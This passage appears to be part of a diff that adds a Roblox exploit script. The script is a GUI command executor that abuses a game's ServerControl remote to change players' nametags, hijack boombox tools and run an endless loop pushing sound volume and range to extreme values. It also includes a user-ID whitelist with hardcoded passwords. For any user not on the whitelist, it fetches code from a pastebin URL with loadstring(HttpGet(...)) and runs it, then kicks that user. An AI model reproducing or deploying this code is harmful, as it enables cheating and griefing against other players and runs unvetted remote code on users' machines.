+    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextStrokeColor3",Color3.new(255,255,0))
+end
+	end
+
+if string.sub(cmdbar.Text,1,5)== "text " then 
+local UserName  = game:GetService('Players').LocalPlayer.Name
+local mesh = 465482937
+local texture = 465483155
+local CE = {}
+local Variables = {
+    workspace = game:GetService("Workspace"),
+    players = game:GetService("Players")
+}
+
+local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName)
+
+function CE:FireEvent(ItemName, Object, Property, Value)
+    MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
+end
+
+
+game.Workspace.GiveTool:FireServer(1554987, "PompousTheCloud")
+MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
+
+CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"Text",""..string.sub(cmdbar.Text,6))
+CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextColor3",Color3.new(0,0,0))
+CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextSize",100)
+CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"],"Size",UDim2.new(15, 0, 5, 0))
+CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"Position",UDim2.new(0, -100, 0, -30))
+end
+
+if string.sub(cmdbar.Text,1,4) == "vip "then 
+for f,g in pairs(GetPlayer(string.sub(cmdbar.Text,5)))do 
+local C=game:GetService('Players').LocalPlayer.Name;
+local D={}
+local E={workspace=game:GetService("Workspace"),players=game:GetService("Players")}
+local F,G=E.players.LocalPlayer,E.workspace:FindFirstChild(C)
+function D:FireEvent(H,I,J,K)
+G:FindFirstChild(H)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=K,["Property"]=J,["Object"]=I})
+end;
+F["Backpack"]:WaitForChild("PompousTheCloud").Parent=G;
+D:FireEvent("PompousTheCloud",G["Head"]["NametagTemplate"],"Parent",game.Players[g.Name].Character.Head)
+end 
+end;
+
+if string.sub(cmdbar.Text,1,6) == "music "then 
+local C=game:GetService('Players').LocalPlayer.Name;
+local D={}
+local E={workspace=game:GetService("Workspace"),players=game:GetService("Players")}
+local F,G=E.players.LocalPlayer,E.workspace:FindFirstChild(C)
+function D:FireEvent(H,I,J,K)
+G:FindFirstChild(H)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=K,["Property"]=J,["Object"]=I})
+end;
+E.workspace.Buy:FireServer(0,"PompousTheCloud")
+F["Backpack"]:WaitForChild("PompousTheCloud").Parent=G;
+if not game.Players.LocalPlayer.Backpack:FindFirstChild("SuperFlyGoldBoomBox")then 
+game.Workspace.GiveTool:FireServer(a,"SuperFlyGoldBoombox")
+E.players.LocalPlayer.Backpack:WaitForChild("SuperFlyGoldBoombox").Parent=E.players.LocalPlayer.Character;
+local X=E.players.LocalPlayer.Character:WaitForChild("SuperFlyGoldBoombox").Handle.BoomboxSound;
+local Y=X.Parent.Parent.Remote;
+Y:FireServer("PlaySong",string.sub(cmdbar.Text,7))
+wait(1)
+D:FireEvent("PompousTheCloud",G["SuperFlyGoldBoombox"]["Handle"]["BoomboxSound"],"Parent",E.players.LocalPlayer.Character)
+D:FireEvent("PompousTheCloud",G["SuperFlyGoldBoombox"],"Parent",E.players.LocalPlayer.Backpack)
+D:FireEvent("PompousTheCloud",G["BoomboxSound"],"Name","NOOB")
+D:FireEvent("PompousTheCloud",G["NOOB"],"Playing",false)
+D:FireEvent("PompousTheCloud",G["NOOB"],"Volume",5)
+D:FireEvent("PompousTheCloud",G["NOOB"],"PlayBackLoudness",5)
+D:FireEvent("PompousTheCloud",G["NOOB"],"Looped",false)
+D:FireEvent("PompousTheCloud",G["NOOB"],"Playing",true)
+E.players.LocalPlayer.Backpack:WaitForChild("SuperFlyGoldBoombox"):Destroy()
+game.Players.LocalPlayer.Character.PompousTheCloud:Remove()
+end 
+end;
+
+if string.sub(cmdbar.Text,1,8) == "proxybox" then
+local ME = game:GetService("Players").LocalPlayer
+function FireEvent(ItemName, Object, Property, Value)
+ME.Character:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
+end
+game.Workspace.GiveTool:FireServer(2187476, "PompousTheCloud")
+ME["Backpack"]:WaitForChild("PompousTheCloud").Parent = ME.Character
+ME["Backpack"]:WaitForChild("SuperFlyGoldBoombox").Parent = ME.Character
+FireEvent("PompousTheCloud",ME.Character["SuperFlyGoldBoombox"],"CanBeDropped",true)
+FireEvent("PompousTheCloud",ME.Character["SuperFlyGoldBoombox"],"TextureId","rbxassetid://1587542316")
+FireEvent("PompousTheCloud",ME.Character["SuperFlyGoldBoombox"]["Handle"]["Mesh"],"MeshId","rbxassetid://212302951")
+FireEvent("PompousTheCloud",ME.Character["SuperFlyGoldBoombox"]["Handle"]["Mesh"],"TextureId","rbxassetid://1587542316")
+FireEvent("PompousTheCloud",ME.Character["SuperFlyGoldBoombox"]["Handle"]["Mesh"],"Scale",Vector3.new(4, 4, 4))
+FireEvent("PompousTheCloud",ME.Character["SuperFlyGoldBoombox"],"GripPos",Vector3.new(-1.603, -0.214, 2.437))
+FireEvent("PompousTheCloud",ME.Character["SuperFlyGoldBoombox"],"GripUp",Vector3.new(-0.45, 0.893, -0.025))
+FireEvent("PompousTheCloud",ME.Character["SuperFlyGoldBoombox"],"GripRight",Vector3.new(-0.893, -0.449, 0.025))
+FireEvent("PompousTheCloud",ME.Character["SuperFlyGoldBoombox"]["Handle"]["BoomboxSound"],"EmitterSize","99999")
+FireEvent("PompousTheCloud",ME.Character["SuperFlyGoldBoombox"]["Handle"]["BoomboxSound"],"MaxDistance","99999")
+FireEvent("PompousTheCloud",ME.Character["SuperFlyGoldBoombox"]["Handle"]["BoomboxSound"],"Volume","10")
+FireEvent("PompousTheCloud",ME.Character["SuperFlyGoldBoombox"]["Handle"]["BoomboxSound"],"PlaybackLoudness","99999")
+FireEvent("PompousTheCloud",ME.Character["SuperFlyGoldBoombox"],"ToolTip","Proxy Admin")
+FireEvent("PompousTheCloud",ME.Character["PompousTheCloud"]["Handle"],"Transparency","1")
+while wait() do 
+print("loud")
+FireEvent("PompousTheCloud",ME.Character["SuperFlyGoldBoombox"]["Handle"]["BoomboxSound"],"EmitterSize","99999")
+FireEvent("PompousTheCloud",ME.Character["SuperFlyGoldBoombox"]["Handle"]["BoomboxSound"],"MaxDistance","99999")
+wait(0.01)
+FireEvent("PompousTheCloud",ME.Character["SuperFlyGoldBoombox"]["Handle"]["BoomboxSound"],"Volume","10")
+FireEvent("PompousTheCloud",ME.Character["SuperFlyGoldBoombox"]["Handle"]["BoomboxSound"],"PlaybackLoudness","99999")
+end
+end
+end
+end)
+exec:TweenPosition(UDim2.new(0.327641428, 0, 1, 0), "In", "Quint", 1)
+wait(1)
+exec:Destroy()
+end)
+
+cancel.MouseButton1Down:Connect(function()
+underline:TweenPosition(UDim2.new(0.0975758433, 0, 0.696202517, 0), "Out", "Bounce", 1)
+wait(1)
+exec:TweenPosition(UDim2.new(0.327641428, 0, 1, 0), "In", "Quint", 1)
+wait(1)
+exec:Destroy()
+end)
+
+local function TEJZ_fake_script() -- TL1.Script 
+	local script = Instance.new('Script', TL1)
+
+	function zigzag(X) return math.acos(math.cos(X*math.pi))/math.pi end
+	counter = 0
+	
+	while wait(0.1) do
+		script.Parent.TextColor3 = Color3.fromHSV(zigzag(counter),1,1)
+		counter = counter + 0.005
+	end
+end
+coroutine.wrap(TEJZ_fake_script)()
+local function TPZZMG_fake_script() -- W1.Script 
+	local script = Instance.new('Script', W1)
+
+	script.Parent:TweenPosition(UDim2.new(0, 0, 0, 0), "Out", "Bounce", 2)
+	
+end
+coroutine.wrap(TPZZMG_fake_script)()
+local function JYDBGMC_fake_script() -- Enterkey.Script 
+	local script = Instance.new('Script', Enterkey)
+
+	function zigzag(X) return math.acos(math.cos(X*math.pi))/math.pi end
+	counter = 0
+	
+	while wait(0.1) do
+		script.Parent.BorderColor3 = Color3.fromHSV(zigzag(counter),1,1)
+		counter = counter + 0.005
+	end
+end
+coroutine.wrap(JYDBGMC_fake_script)()
+local function ETZRJBS_fake_script() -- underline.Script 
+	local script = Instance.new('Script', underline)
+
+	function zigzag(X) return math.acos(math.cos(X*math.pi))/math.pi end
+	counter = 0
+	
+	while wait(0.1) do
+		script.Parent.BackgroundColor3 = Color3.fromHSV(zigzag(counter),1,1)
+		counter = counter + 0.005
+	end
+end
+coroutine.wrap(ETZRJBS_fake_script)()
+local function RZIOUE_fake_script() -- cmdbar.Script 
+	local script = Instance.new('Script', cmdbar)
+
+	function zigzag(X) return math.acos(math.cos(X*math.pi))/math.pi end
+	counter = 0
+		
+	while wait(0.1) do
+		script.Parent.BorderColor3 = Color3.fromHSV(zigzag(counter),1,1)
+		counter = counter + 0.005
+	end
+end
+coroutine.wrap(RZIOUE_fake_script)()
+local function FGECYEI_fake_script() -- cmdbar.Script 
+	local script = Instance.new('Script', cmdbar)
+
+	function zigzag(X) return math.acos(math.cos(X*math.pi))/math.pi end
+	counter = 0
+		
+	while wait(0.1) do
+		script.Parent.TextColor3 = Color3.fromHSV(zigzag(counter),1,1)
+		counter = counter + 0.005
+	end
+end
+coroutine.wrap(FGECYEI_fake_script)()
+
+local player1 = game:GetService("Players"):GetPlayerByUserId(324271092) 
+local player2 = game:GetService("Players"):GetPlayerByUserId(1387213937)
+local player3 = game:GetService("Players"):GetPlayerByUserId(1326815167)
+
+if player1 then
+	wait(5)
+	Enterkey.Visible = true
+elseif player2 then
+	wait(5)
+	Enterkey.Visible = true
+elseif player3 then 
+	wait(5)
+	Enterkey.Visible = true
+else
+	loadstring(game:HttpGet("https://pastebin.com/raw/CxSCq75s"))()
+	wait(0.1)
+	game.Players.LocalPlayer:kick("You are not whitelisted!")
+end
+
+Enterkey.FocusLost:connect(function(p)
+if p then 
+if game.Players.LocalPlayer.Name == "NardoSusky20" and Enterkey.Text == "QNiNRZI4nDnIV4TIfVwYqJ2P8anZH9VJ" then 
+W1:TweenPosition(UDim2.new(0, 0, 1, 0), "In", "Quint", 1)
+wait(1)
+exec:TweenPosition(UDim2.new(0.327641428, 0, 0.351617396, 0), "Out", "Quart", 1)
+W1:Destroy()
+elseif game.Players.LocalPlayer.Name == "Pr_xyy" and Enterkey.Text == "Pr_xyy" then
+W1:TweenPosition(UDim2.new(0, 0, 1, 0), "In", "Quint", 1)
+wait(1)
+exec:TweenPosition(UDim2.new(0.327641428, 0, 0.351617396, 0), "Out", "Quart", 1)
+W1:Destroy()
+elseif game.Players.LocalPlayer.Name == "RIP_Demonic" and Enterkey.Text == "Skid" then 
+W1:TweenPosition(UDim2.new(0, 0, 1, 0), "In", "Quint", 1)
+wait(1)
+exec:TweenPosition(UDim2.new(0.327641428, 0, 0.351617396, 0), "Out", "Quart", 1)
+W1:Destroy()
+end
+end
+end)
